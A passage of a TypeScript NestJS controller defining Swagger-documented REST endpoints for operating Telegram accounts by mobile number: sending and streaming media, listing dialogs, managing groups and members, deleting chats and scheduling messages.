Telegram account', required: true, example: '1234567890' })\n    @ApiBody({ type: SendMediaDto })\n    @ApiResponse({ \n        status: 200, \n        description: 'Media sent successfully',\n        type: Object \n    })\n    @ApiResponse({ \n        status: 400, \n        description: 'Invalid request - file too large, invalid URL, or missing required fields' \n    })\n    @ApiResponse({ \n        status: 500, \n        description: 'Failed to send media - check Telegram connection or file accessibility' \n    })\n    async sendMedia(@Param('mobile') mobile: string, @Body() sendMediaDto: SendMediaDto) {\n        // Validate file size before processing\n        if (sendMediaDto.url) {\n            try {\n                const headResponse = await axios.head(sendMediaDto.url, { timeout: 10000 });\n                const contentLength = parseInt(headResponse.headers['content-length'] || '0', 10);\n                const maxSize = 100 * 1024 * 1024; // 100MB\n                \n                if (contentLength > maxSize) {\n                    const fileSizeMB = (contentLength / (1024 * 1024)).toFixed(2);\n                    const maxSizeMB = (maxSize / (1024 * 1024)).toFixed(0);\n                    throw new BadRequestException(\n                        `File size (${fileSizeMB} MB) exceeds maximum allowed size of ${maxSizeMB} MB. Please use a smaller file.`\n                    );\n                }\n            } catch (error) {\n                if (error instanceof BadRequestException) {\n                    throw error;\n                }\n                // Continue if HEAD request fails (some servers don't support it)\n                // File size validation is optional - proceed with download\n            }\n        }\n        \n        try {\n            const client = await connectionManager.getClient(mobile);\n            if (sendMediaDto.type === MediaType.PHOTO) {\n                return await client.sendPhotoChat(sendMediaDto.chatId, sendMediaDto.url, sendMediaDto.caption, sendMediaDto.filename);\n            }\n            return await client.sendFileChat(sendMediaDto.chatId, sendMediaDto.url, sendMediaDto.caption, sendMediaDto.filename);\n        } catch (error) {\n            // Re-throw BadRequestException as-is\n            if (error instanceof BadRequestException) {\n                throw error;\n            }\n            // For other errors, provide user-friendly message\n            throw new BadRequestException(`Failed to send media: ${error.message || 'Unknown error'}`);\n        }\n    }\n\n    @Get('media/download/:mobile')\n    @ApiOperation({ \n        summary: 'Preview or download media from a message',\n        description: 'Download or preview media from a Telegram message. Images and videos preview in browser, other files download. Supports HTTP Range requests for video streaming.'\n    })\n    @ApiParam({ name: 'mobile', description: 'Mobile number of the Telegram account', required: true, example: '1234567890' })\n    @ApiQuery({ \n        name: 'chatId', \n        required: true, \n        description: 'Chat ID or username. Use \"me\" for saved messages, channel username (e.g., \"channelname\"), or numeric ID',\n        example: 'me'\n    })\n    @ApiQuery({ \n        name: 'messageId', \n        required: true, \n        description: 'Message ID containing the media (must be a positive number)',\n        type: Number,\n        example: 12345\n    })\n    @ApiResponse({ \n        status: 200,\n        description: 'Media file (preview in browser for images/videos, download for other types)',\n        content: {\n            'image/*': { schema: { type: 'string', format: 'binary' } },\n            'video/*': { schema: { type: 'string', format: 'binary' } },\n            'application/*': { schema: { type: 'string', format: 'binary' } }\n        }\n    })\n    @ApiResponse({ \n        status: 206,\n        description: 'Partial content (when using Range header for video streaming)'\n    })\n    @ApiResponse({ \n        status: 304,\n        description: 'Not modified (when using If-None-Match header for caching)'\n    })\n    @ApiResponse({ \n        status: 404, \n        description: 'Media not found - message ID does not exist or message has no media' \n    })\n    @ApiResponse({ \n        status: 416,\n        description: 'Range not satisfiable - invalid Range header'\n    })\n    async downloadMedia(\n        @Param('mobile') mobile: string, \n        @Query('chatId') chatId: string, \n        @Query('messageId') messageId: number, \n        @Res() res: Response\n    ) {\n        // Validate messageId\n        if (!messageId || messageId <= 0 || !Number.isInteger(messageId)) {\n            throw new BadRequestException('Message ID must be a positive integer');\n        }\n        \n        // Validate chatId\n        if (!chatId || chatId.trim().length === 0) {\n            throw new BadRequestException('Chat ID is required and cannot be empty');\n        }\n        \n        try {\n            const fileInfo = await this.telegramService.getMediaFileDownloadInfo(mobile, messageId, chatId);\n            \n            // Check If-None-Match header for 304 Not Modified\n            if (res.req.headers['if-none-match'] === fileInfo.etag) {\n                return res.status(304).end();\n            }\n            \n            // Support HTTP Range requests for video streaming\n            const range = res.req.headers.range;\n            const chunkSize = 512 * 1024; // 512 KB chunks\n            \n            if (range && fileInfo.fileSize > 0) {\n                // Parse Range header: \"bytes=start-end\"\n                const parts = range.replace(/bytes=/, \"\").split(\"-\");\n                const start = parseInt(parts[0], 10);\n                const end = parts[1] ? parseInt(parts[1], 10) : fileInfo.fileSize - 1;\n                const chunksize = (end - start) + 1;\n\n                // Validate range\n                if (start >= fileInfo.fileSize || end >= fileInfo.fileSize || start > end) {\n                    res.status(416).setHeader('Content-Range', `bytes */${fileInfo.fileSize}`);\n                    return res.end();\n                }\n\n                res.status(206); // Partial Content\n                res.setHeader('Content-Range', `bytes ${start}-${end}/${fileInfo.fileSize}`);\n                res.setHeader('Accept-Ranges', 'bytes');\n                res.setHeader('Content-Length', chunksize);\n                res.setHeader('Content-Type', fileInfo.contentType);\n                res.setHeader('Content-Disposition', `inline; filename=\"${fileInfo.filename}\"`);\n                res.setHeader('Cache-Control', 'public, max-age=3600');\n                res.setHeader('ETag', fileInfo.etag);\n                \n                // Enable progressive video playback\n                res.setHeader('X-Content-Type-Options', 'nosniff');\n                res.setHeader('Access-Control-Allow-Origin', '*');\n                res.setHeader('Access-Control-Expose-Headers', 'Content-Length, Content-Range, Accept-Ranges');\n\n                // Stream only the requested range\n                for await (const chunk of this.telegramService.streamMediaFile(\n                    mobile, \n                    fileInfo.fileLocation, \n                    bigInt(start), \n                    chunksize, \n                    chunkSize\n                )) {\n                    res.write(chunk);\n                }\n            } else {\n                // Full file download\n                res.setHeader('Content-Type', fileInfo.contentType);\n                res.setHeader('Content-Disposition', `inline; filename=\"${fileInfo.filename}\"`);\n                res.setHeader('Cache-Control', 'public, max-age=3600');\n                res.setHeader('ETag', fileInfo.etag);\n                res.setHeader('Accept-Ranges', 'bytes');\n                \n                // Enable progressive video playback\n                res.setHeader('X-Content-Type-Options', 'nosniff');\n                res.setHeader('Access-Control-Allow-Origin', '*');\n                res.setHeader('Access-Control-Expose-Headers', 'Content-Length, Accept-Ranges');\n                \n                if (fileInfo.fileSize > 0) {\n                    res.setHeader('Content-Length', fileInfo.fileSize);\n                }\n\n                for await (const chunk of this.telegramService.streamMediaFile(\n                    mobile, \n                    fileInfo.fileLocation, \n                    bigInt(0), \n                    5 * 1024 * 1024, \n                    chunkSize\n                )) {\n                    res.write(chunk);\n                }\n            }\n            res.end();\n        } catch (error) {\n            if (error.message?.includes('FILE_REFERENCE_EXPIRED') || error.message?.includes('not found')) {\n                return res.status(404).send(error.message || 'File reference expired');\n            }\n            if (!res.headersSent) {\n                res.status(500).send('Error downloading media');\n            }\n        }\n    }\n\n    @Get('media/thumbnail/:mobile')\n    @ApiOperation({ \n        summary: 'Get thumbnail for a media message',\n        description: 'Get thumbnail image for a Telegram message containing media (photo or video). Returns JPEG image. Supports caching with ETag headers.'\n    })\n    @ApiParam({ name: 'mobile', description: 'Mobile number of the Telegram account', required: true, example: '1234567890' })\n    @ApiQuery({ \n        name: 'chatId', \n        required: true, \n        description: 'Chat ID or username. Use \"me\" for saved messages, channel username (e.g., \"channelname\"), or numeric ID',\n        example: 'me'\n    })\n    @ApiQuery({ \n        name: 'messageId', \n        required: true, \n        description: 'Message ID containing the media (must be a positive number)',\n        type: Number,\n        example: 12345\n    })\n    @ApiResponse({ \n        status: 200,\n        description: 'Thumbnail image (JPEG format)',\n        content: {\n            'image/jpeg': { schema: { type: 'string', format: 'binary' } }\n        }\n    })\n    @ApiResponse({ \n        status: 304,\n        description: 'Not modified (when using If-None-Match header for caching)'\n    })\n    @ApiResponse({ \n        status: 404, \n        description: 'Thumbnail not found - message ID does not exist, message has no media, or thumbnail is not available' \n    })\n    @ApiResponse({ \n        status: 500,\n        description: 'Error getting thumbnail'\n    })\n    async getThumbnail(\n        @Param('mobile') mobile: string, \n        @Query('chatId') chatId: string, \n        @Query('messageId') messageId: number, \n        @Res() res: Response\n    ) {\n        // Validate messageId\n        if (!messageId || messageId <= 0 || !Number.isInteger(messageId)) {\n            throw new BadRequestException('Message ID must be a positive integer');\n        }\n        \n        // Validate chatId\n        if (!chatId || chatId.trim().length === 0) {\n            throw new BadRequestException('Chat ID is required and cannot be empty');\n        }\n        \n        try {\n            const thumbnail = await this.telegramService.getThumbnail(mobile, messageId, chatId);\n            \n            // Check If-None-Match header for 304 Not Modified\n            if (res.req.headers['if-none-match'] === thumbnail.etag) {\n                return res.status(304).end();\n            }\n            \n            // Set response headers\n            res.setHeader('Content-Type', thumbnail.contentType);\n            res.setHeader('Content-Disposition', `inline; filename=\"${thumbnail.filename}\"`);\n            res.setHeader('Cache-Control', 'public, max-age=3600');\n            res.setHeader('ETag', thumbnail.etag);\n            res.setHeader('Content-Length', thumbnail.buffer.length);\n            \n            return res.send(thumbnail.buffer);\n        } catch (error) {\n            if (error.message?.includes('FILE_REFERENCE_EXPIRED') || error.message?.includes('not found') || error.message?.includes('not available')) {\n                return res.status(404).send(error.message || 'Thumbnail not available');\n            }\n            if (!res.headersSent) {\n                res.status(500).send('Error getting thumbnail');\n            }\n        }\n    }\n\n    @Post('media/album/:mobile')\n    @ApiOperation({ \n        summary: 'Send media album (multiple photos/videos)',\n        description: 'Send multiple media files as an album. If some items fail, the operation continues and returns a summary of successful and failed items.'\n    })\n    @ApiParam({ name: 'mobile', description: 'Mobile number of the Telegram account', required: true, example: '1234567890' })\n    @ApiBody({ type: SendMediaAlbumDto })\n    @ApiResponse({ \n        status: 200,\n        description: 'Album sent with summary of results',\n        schema: {\n            type: 'object',\n            properties: {\n                success: { type: 'number', description: 'Number of successfully sent items' },\n                failed: { type: 'number', description: 'Number of failed items' },\n                errors: { \n                    type: 'array',\n                    items: {\n                        type: 'object',\n                        properties: {\n                            index: { type: 'number', description: 'Index of failed item' },\n                            error: { type: 'string', description: 'Error message' }\n                        }\n                    },\n                    description: 'Details of failed items (only present if failed > 0)'\n                }\n            }\n        }\n    })\n    @ApiResponse({ \n        status: 400, \n        description: 'Invalid request - empty album, invalid URLs, or file size exceeds limit' \n    })\n    @ApiResponse({ \n        status: 500, \n        description: 'Failed to send album - all items failed or Telegram connection error' \n    })\n    async sendMediaAlbum(@Param('mobile') mobile: string, @Body() albumDto: MediaAlbumOptions) {\n        // Validate album has items\n        if (!albumDto.media || albumDto.media.length === 0) {\n            throw new BadRequestException('Album must contain at least one media item');\n        }\n        \n        // Validate max album size (Telegram limit is 10 items)\n        if (albumDto.media.length > 10) {\n            throw new BadRequestException(`Album cannot contain more than 10 items. You provided ${albumDto.media.length} items.`);\n        }\n        \n        return this.telegramService.sendMediaAlbum(mobile, albumDto);\n    }\n\n    @Get('media/metadata/:mobile')\n    @ApiOperation({ \n        summary: 'Get media metadata from a chat',\n        description: 'Retrieve metadata for media messages in a chat. Supports filtering by type, date range, and message ID range. Use maxId for pagination (get messages with ID less than maxId).'\n    })\n    @ApiParam({ name: 'mobile', description: 'Mobile number of the Telegram account', required: true, example: '1234567890' })\n    @ApiQuery({ \n        name: 'chatId', \n        required: true,\n        description: 'Chat ID or username. Use \"me\" for saved messages, channel username, or numeric ID',\n        example: 'me'\n    })\n    @ApiQuery({ \n        name: 'types', \n        enum: ['photo', 'video', 'document', 'voice', 'all'], \n        required: false, \n        isArray: true,\n        description: 'Filter by media types. Use \"all\" to get all types grouped by type. If not specified, returns all media types.',\n        example: ['photo', 'video']\n    })\n    @ApiQuery({ \n        name: 'startDate', \n        required: false,\n        description: 'Start date for filtering (ISO 8601 format: YYYY-MM-DD or YYYY-MM-DDTHH:mm:ss)',\n        example: '2024-01-01'\n    })\n    @ApiQuery({ \n        name: 'endDate', \n        required: false,\n        description: 'End date for filtering (ISO 8601 format: YYYY-MM-DD or YYYY-MM-DDTHH:mm:ss)',\n        example: '2024-12-31'\n    })\n    @ApiQuery({ \n        name: 'limit', \n        description: 'Maximum number of messages to fetch (default: 50, max: 1000)', \n        required: false, \n        type: Number,\n        example: 50\n    })\n    @ApiQuery({ \n        name: 'maxId', \n        required: false, \n        type: Number,\n        description: 'Maximum message ID to include (use for pagination - get messages with ID less than this. Use nextMaxId from previous response for next page)',\n        example: 12345\n    })\n    @ApiQuery({ \n        name: 'minId', \n        required: false, \n        type: Number,\n        description: 'Minimum message ID to include',\n        example: 1000\n    })\n    @ApiResponse({ \n        status: 200,\n        description: 'Media metadata retrieved successfully',\n        type: Object\n    })\n    @ApiResponse({ \n        status: 400,\n        description: 'Invalid request - invalid date format, chat ID, or limit value'\n    })\n    async getMediaMetadata(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('types', new ParseArrayPipe({ items: String, separator: ',', optional: true })) types?: string | string[],\n        @Query('startDate') startDate?: string,\n        @Query('endDate') endDate?: string,\n        @Query('limit') limit?: number,\n        @Query('maxId') maxId?: number,\n        @Query('minId') minId?: number\n    ) {\n        // Validate chatId\n        if (!chatId || chatId.trim().length === 0) {\n            throw new BadRequestException('Chat ID is required and cannot be empty');\n        }\n        \n        // Validate limit\n        if (limit !== undefined && (limit <= 0 || limit > 1000)) {\n            throw new BadRequestException('Limit must be between 1 and 1000');\n        }\n        \n        // Parse types array - handle both string and array formats\n        let parsedTypes: ('photo' | 'video' | 'document' | 'voice' | 'all')[] | undefined;\n        if (types) {\n            const typesArray = Array.isArray(types) ? types : [types];\n            const validTypes = ['photo', 'video', 'document', 'voice', 'all'];\n            parsedTypes = typesArray\n                .filter(t => validTypes.includes(t.toLowerCase()))\n                .map(t => t.toLowerCase()) as ('photo' | 'video' | 'document' | 'voice' | 'all')[];\n            \n            if (parsedTypes.length === 0) {\n                throw new BadRequestException(`Invalid types. Must be one or more of: ${validTypes.join(', ')}`);\n            }\n        }\n        \n        // Validate date formats\n        let parsedStartDate: Date | undefined;\n        let parsedEndDate: Date | undefined;\n        \n        if (startDate && startDate.trim()) {\n            parsedStartDate = new Date(startDate);\n            if (isNaN(parsedStartDate.getTime())) {\n                throw new BadRequestException(`Invalid startDate format. Use ISO 8601 format (e.g., \"2024-01-01\" or \"2024-01-01T10:00:00\")`);\n            }\n        }\n        \n        if (endDate && endDate.trim()) {\n            parsedEndDate = new Date(endDate);\n            if (isNaN(parsedEndDate.getTime())) {\n                throw new BadRequestException(`Invalid endDate format. Use ISO 8601 format (e.g., \"2024-12-31\" or \"2024-12-31T23:59:59\")`);\n            }\n        }\n        \n        // Validate date range\n        if (parsedStartDate && parsedEndDate && parsedStartDate > parsedEndDate) {\n            throw new BadRequestException('startDate must be before or equal to endDate');\n        }\n        \n        return this.telegramService.getMediaMetadata(mobile, {\n            chatId,\n            types: parsedTypes,\n            startDate: parsedStartDate,\n            endDate: parsedEndDate,\n            limit,\n            maxId,\n            minId\n        });\n    }\n\n    @Get('media/filter/:mobile')\n    @ApiOperation({ \n        summary: 'Get filtered media messages from a chat',\n        description: 'Get filtered list of media messages with detailed metadata including thumbnails. Returns standardized paginated response. Use maxId for pagination (get messages with ID less than maxId).'\n    })\n    @ApiParam({ name: 'mobile', description: 'Mobile number of the Telegram account', required: true, example: '1234567890' })\n    @ApiQuery({ \n        name: 'chatId', \n        required: true, \n        description: 'Chat ID or username. Use \"me\" for saved messages, channel username, or numeric ID',\n        example: 'me'\n    })\n    @ApiQuery({ \n        name: 'types', \n        required: false, \n        enum: ['photo', 'video', 'document', 'voice', 'all'], \n        isArray: true,\n        description: 'Filter by media types. Use \"all\" to get all types grouped by type. If not specified, returns all media types.',\n        example: ['photo', 'video']\n    })\n    @ApiQuery({ \n        name: 'startDate', \n        required: false, \n        description: 'Filter media after this date (ISO 8601 format: YYYY-MM-DD or YYYY-MM-DDTHH:mm:ss)',\n        example: '2024-01-01'\n    })\n    @ApiQuery({ \n        name: 'endDate', \n        required: false, \n        description: 'Filter media before this date (ISO 8601 format: YYYY-MM-DD or YYYY-MM-DDTHH:mm:ss)',\n        example: '2024-12-31'\n    })\n    @ApiQuery({ \n        name: 'limit', \n        required: false, \n        type: Number, \n        description: 'Maximum number of media items to fetch (default: 50, max: 1000)',\n        example: 50\n    })\n    @ApiQuery({ \n        name: 'maxId', \n        required: false, \n        type: Number, \n        description: 'Maximum message ID to include (use for pagination - get messages with ID less than this. Use nextMaxId from previous response for next page)',\n        example: 12345\n    })\n    @ApiQuery({ \n        name: 'minId', \n        required: false, \n        type: Number, \n        description: 'Minimum message ID to include',\n        example: 1000\n    })\n    @ApiResponse({ \n        status: 200,\n        description: 'Paginated media response with standardized format',\n        type: Object\n    })\n    @ApiResponse({ \n        status: 400,\n        description: 'Invalid request - invalid date format, chat ID, or limit value' \n    })\n    async getFilteredMedia(\n        @Param('mobile') mobile: string,\n        @Query('chatId') chatId: string,\n        @Query('types', new ParseArrayPipe({ items: String, separator: ',', optional: true })) types?: string | string[],\n        @Query('startDate') startDate?: string,\n        @Query('endDate') endDate?: string,\n        @Query('limit') limit?: number,\n        @Query('maxId') maxId?: number,\n        @Query('minId') minId?: number\n    ) {\n        // Validate chatId\n        if (!chatId || chatId.trim().length === 0) {\n            throw new BadRequestException('Chat ID is required and cannot be empty');\n        }\n        \n        // Validate limit\n        if (limit !== undefined && (limit <= 0 || limit > 1000)) {\n            throw new BadRequestException('Limit must be between 1 and 1000');\n        }\n        \n        // Parse types array - handle both string and array formats\n        let parsedTypes: ('photo' | 'video' | 'document' | 'voice' | 'all')[] | undefined;\n        if (types) {\n            const typesArray = Array.isArray(types) ? types : [types];\n            const validTypes = ['photo', 'video', 'document', 'voice', 'all'];\n            parsedTypes = typesArray\n                .filter(t => validTypes.includes(t.toLowerCase()))\n                .map(t => t.toLowerCase()) as ('photo' | 'video' | 'document' | 'voice' | 'all')[];\n            \n            if (parsedTypes.length === 0) {\n                throw new BadRequestException(`Invalid types. Must be one or more of: ${validTypes.join(', ')}`);\n            }\n        }\n        \n        // Validate date formats\n        let parsedStartDate: Date | undefined;\n        let parsedEndDate: Date | undefined;\n        \n        if (startDate && startDate.trim()) {\n            parsedStartDate = new Date(startDate);\n            if (isNaN(parsedStartDate.getTime())) {\n                throw new BadRequestException(`Invalid startDate format. Use ISO 8601 format (e.g., \"2024-01-01\" or \"2024-01-01T10:00:00\")`);\n            }\n        }\n        \n        if (endDate && endDate.trim()) {\n            parsedEndDate = new Date(endDate);\n            if (isNaN(parsedEndDate.getTime())) {\n                throw new BadRequestException(`Invalid endDate format. Use ISO 8601 format (e.g., \"2024-12-31\" or \"2024-12-31T23:59:59\")`);\n            }\n        }\n        \n        // Validate date range\n        if (parsedStartDate && parsedEndDate && parsedStartDate > parsedEndDate) {\n            throw new BadRequestException('startDate must be before or equal to endDate');\n        }\n        \n        return this.telegramService.getFilteredMedia(mobile, {\n            chatId,\n            types: parsedTypes,\n            startDate: parsedStartDate,\n            endDate: parsedEndDate,\n            limit,\n            maxId,\n            minId\n        });\n    }\n\n    @Get('group/members/:mobile')\n    @ApiOperation({ summary: 'Get group members' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'groupId', description: 'Group ID', required: true })\n    @ApiResponse({ type: Object })\n    async getGroupMembers(@Param('mobile') mobile: string, @Query('groupId') groupId: string) {\n        return this.telegramService.getGrpMembers(mobile, groupId);\n    }\n\n    @Post('chat/block/:mobile')\n    @ApiOperation({ summary: 'Block a chat/user' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat/User ID to block', required: true })\n    @ApiResponse({ type: Object })\n    async blockChat(@Param('mobile') mobile: string, @Query('chatId') chatId: string) {\n        return this.telegramService.blockUser(mobile, chatId);\n    }\n\n    @Delete('chat/:mobile')\n    @ApiOperation({ summary: 'Delete or clear a chat history for a user' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number of the user whose chat should be deleted', required: true })\n    @ApiQuery({ name: 'peer', description: 'Username or Peer ID of the chat to delete', required: true })\n    @ApiQuery({ name: 'maxId', required: false, description: 'Delete messages with ID  maxId' })\n    @ApiQuery({ name: 'justClear', required: false, description: 'Only clear history for this user', type: Boolean })\n    @ApiQuery({ name: 'revoke', required: false, description: 'Delete for everyone if possible', type: Boolean })\n    @ApiQuery({ name: 'minDate', required: false, description: 'Minimum date (UNIX timestamp)' })\n    @ApiQuery({ name: 'maxDate', required: false, description: 'Maximum date (UNIX timestamp)' })\n    @ApiResponse({ type: Object })\n    async deleteChatHistory(@Param('mobile') mobile: string, @Query() deleteHistoryDto: DeleteHistoryDto) {\n        return this.telegramService.deleteChat(mobile, deleteHistoryDto);\n    }\n\n    @Get('messages/inline/:mobile')\n    @ApiOperation({ summary: 'Send message with inline button' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', required: true })\n    @ApiQuery({ name: 'message', required: true })\n    @ApiQuery({ name: 'url', required: true })\n    @ApiResponse({ type: Object })\n    async sendMessageWithInlineButton(@Param('mobile') mobile: string, @Query('chatId') chatId: string, @Query('message') message: string, @Query('url') url: string) {\n        return this.telegramService.sendInlineMessage(mobile, chatId, message, url);\n    }\n    \n\n    @Get('dialogs/:mobile')\n    @ApiOperation({\n        summary: 'Get dialogs (paginated dialog list)',\n        description: 'Paginated dialog list with optional filters. Use nextOffsetDate from response as offsetDate for next page (time-based cursor). Single endpoint for dialog list.',\n    })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'limit', required: false, type: Number, description: 'Items per page (default 100)' })\n    @ApiQuery({ name: 'offsetDate', required: false, type: Number, description: 'Cursor: Unix seconds from previous nextOffsetDate' })\n    @ApiQuery({ name: 'folderId', required: false, type: Number, enum: [0, 1], description: '0 = main, 1 = archived (overrides archived)' })\n    @ApiQuery({ name: 'archived', required: false, type: Boolean, description: 'Include archived folder (folder=1)' })\n    @ApiQuery({ name: 'peerType', required: false, enum: ['all', 'user', 'group', 'channel'], description: 'Filter by type' })\n    @ApiQuery({ name: 'ignorePinned', required: false, type: Boolean, description: 'Exclude pinned dialogs' })\n    @ApiQuery({ name: 'includePhotos', required: false, type: Boolean, description: 'Include base64 chat photos (default: false)' })\n    @ApiResponse({\n        status: 200,\n        schema: {\n            type: 'object',\n            properties: {\n                items: { type: 'array', description: 'Chat list (id, title, username, type, unreadCount, lastMessage, etc.)' },\n                hasMore: { type: 'boolean' },\n                nextOffsetDate: { type: 'number', description: 'Use as offsetDate for next page (Unix s)' },\n            },\n        },\n    })\n    async getDialogs(\n        @Param('mobile') mobile: string,\n        @Query('limit') limit?: number,\n        @Query('offsetDate') offsetDate?: number,\n        @Query('folderId') folderId?: number,\n        @Query('archived') archived?: boolean,\n        @Query('peerType') peerType?: string,\n        @Query('ignorePinned') ignorePinned?: boolean,\n        @Query('includePhotos') includePhotos?: boolean,\n    ) {\n        return this.telegramService.getDialogs(mobile, {\n            limit,\n            offsetDate,\n            folderId,\n            archived: archived === true,\n            peerType: peerType as 'all' | 'user' | 'group' | 'channel' | undefined,\n            ignorePinned: ignorePinned === true,\n            includePhotos,\n        });\n    }\n\n    @Get('last-active/:mobile')\n    @ApiOperation({ summary: 'Get last active time' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiResponse({ type: Object })\n    async getLastActiveTime(@Param('mobile') mobile: string) {\n        return this.telegramService.getLastActiveTime(mobile);\n    }\n\n    @Post('group/create/:mobile')\n    @ApiOperation({ summary: 'Create a new group with advanced options' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: createGroupDto })\n    @ApiResponse({ type: Object })\n    async createGroupWithOptions(@Param('mobile') mobile: string, @Body() options: createGroupDto) {\n        return this.telegramService.createGroupWithOptions(mobile, options);\n    }\n\n    @Post('group/settings/:mobile')\n    @ApiOperation({ summary: 'Update group settings' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupSettingsDto })\n    @ApiResponse({ type: Object })\n    async updateGroupSettings(@Param('mobile') mobile: string, @Body() settings: GroupSettingsDto) {\n        return this.telegramService.updateGroupSettings(mobile, settings);\n    }\n\n    @Post('group/members/:mobile')\n    @ApiOperation({ summary: 'Add members to a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupMemberOperationDto })\n    @ApiResponse({ type: Object })\n    async addGroupMembers(@Body() memberOp: GroupMemberOperationDto, @Param('mobile') mobile: string) {\n        return this.telegramService.addGroupMembers(mobile, memberOp.groupId, memberOp.members);\n    }\n\n    @Delete('group/members/:mobile')\n    @ApiOperation({ summary: 'Remove members from a group' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: GroupMemberOperationDto })\n    @ApiResponse({ type: Object })\n    async removeGroupMembers(@Body() memberOp: GroupMemberOperationDto, @Param('mobile') mobile: string) {\n        return this.telegramService.removeGroupMembers(mobile, memberOp.groupId, memberOp.members);\n    }\n\n    @Post('group/admin/:mobile')\n    @ApiOperation({ summary: 'Promote or demote group admins' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: AdminOperationDto })\n    @ApiResponse({ type: Object })\n    async handleAdminOperation(@Body() adminOp: AdminOperationDto, @Param('mobile') mobile: string) {\n        if (adminOp.isPromote) {\n            return this.telegramService.promoteToAdmin(mobile, adminOp.groupId, adminOp.userId, adminOp.permissions, adminOp.rank);\n        } else {\n            return this.telegramService.demoteAdmin(mobile, adminOp.groupId, adminOp.userId);\n        }\n    }\n\n    @Post('chat/cleanup/:mobile')\n    @ApiOperation({ summary: 'Clean up chat history' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ChatCleanupDto })\n    @ApiResponse({ type: Object })\n    async cleanupChat(@Param('mobile') mobile: string, @Body() cleanup: ChatCleanupDto) {\n        return this.telegramService.cleanupChat(mobile, {\n            chatId: cleanup.chatId,\n            beforeDate: cleanup.beforeDate ? new Date(cleanup.beforeDate) : undefined,\n            onlyMedia: cleanup.onlyMedia,\n            excludePinned: cleanup.excludePinned\n        });\n    }\n\n    @Get('chat/statistics/:mobile')\n    @ApiOperation({ summary: 'Get chat statistics' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat ID', required: true })\n    @ApiQuery({ name: 'period', enum: ['day', 'week', 'month'], description: 'Statistics period', required: false })\n    async getChatStatistics(@Param('mobile') mobile: string, @Query('chatId') chatId: string, @Query('period') period: 'day' | 'week' | 'month' = 'week'): Promise<ChatStatistics> {\n        return this.telegramService.getChatStatistics(mobile, chatId, period);\n    }\n\n    @Post('messages/schedule/:mobile')\n    @ApiOperation({ summary: 'Schedule a message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiBody({ type: ScheduleMessageDto })\n    @ApiResponse({ type: Object })\n    async scheduleMessage(@Param('mobile') mobile: string, @Body() schedule: ScheduleMessageDto) {\n        return this.telegramService.scheduleMessage(mobile, {\n            chatId: schedule.chatId,\n            message: schedule.message,\n            scheduledTime: new Date(schedule.scheduledTime),\n            replyTo: schedule.replyTo,\n            silent: schedule.silent\n        });\n    }\n\n    @Get('messages/scheduled/:mobile')\n    @ApiOperation({ summary: 'Get scheduled messages' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiQuery({ name: 'chatId', description: 'Chat ID', required: true })\n    @ApiResponse({ type: Object })\n    async getScheduledMessages(@Param('mobile') mobile: string, @Query('chatId') chatId: string) {\n        return this.telegramService.getScheduledMessages(mobile, chatId);\n    }\n\n    @Post('media/voice/:mobile')\n    @ApiOperation({ \n        summary: 'Send voice message',\n        description: 'Send a voice message (audio file) to a chat. Maximum file size is 100MB. Duration is optional but recommended for better playback.'\n    })\n    @ApiParam({ name: 'mobile', description: 'Mobile number of the Telegram account', required: true, example: '1234567890' })\n    @ApiBody({ \n        schema: { \n            type: 'object', \n            properties: { \n                chatId: { type: 'string', description: 'Chat ID or username', example: 'me' },\n                url: { type: 'string', description: 'URL of the voice file (must be accessible)', example: 'https://example.com/voice.ogg' },\n                duration: { type: 'number', description: 'Duration in seconds (optional but recommended)', example: 30 },\n                caption: { type: 'string', description: 'Optional caption for the voice message' }\n            },\n            required: ['chatId', 'url']\n        } \n    })\n    @ApiResponse({ \n        status: 200,\n        description: 'Voice message sent successfully',\n        type: Object \n    })\n    @ApiResponse({ \n        status: 400, \n        description: 'Invalid request - missing chatId/url, file too large, or invalid URL' \n    })\n    async sendVoiceMessage(@Param('mobile') mobile: string, @Body() voice: { chatId: string; url: string; duration?: number; caption?: string }) {\n        // Validate required fields\n        if (!voice.chatId || voice.chatId.trim().length === 0) {\n            throw new BadRequestException('Chat ID is required and cannot be empty');\n        }\n        \n        if (!voice.url || voice.url.trim().length === 0) {\n            throw new BadRequestException('URL is required and cannot be empty');\n        }\n        \n        // Validate URL format\n        try {\n            new URL(voice.url);\n        } catch {\n            throw new BadRequestException('Invalid URL format. Please provide a valid HTTP/HTTPS URL.');\n        }\n        \n        // Validate duration if provided\n        if (voice.duration !== undefined && (voice.duration < 0 || !Number.isInteger(voice.duration))) {\n            throw new BadRequestException('Duration must be a non-negative integer (in seconds)');\n        }\n        \n        return this.telegramService.sendVoiceMessage(mobile, voice);\n    }\n\n    @Post('media/view-once/:mobile')\n    @ApiOperation({ summary: 'Send a view once (disappearing) media message' })\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\n    @ApiConsumes('multipart/form-data', 'application/json')\n    @ApiBody({\n        schema: {\n            type: 'object',\n            properties: {\n                chatId: { type: 'string', description: 'Chat ID to send the media to' },\n                sourceType: { type: 'string', enum: ['path', 'base64', 'binary'], description: 'Source type of media' },\n                path: { type: 'string', description: 'path of the media file (when sourceType is Path)' },\n                base64Data: { type: 'string', description: 'Base64 data (when sourceType is base64)' },\n                binaryData: { type: 'string', format: 'binary', description: 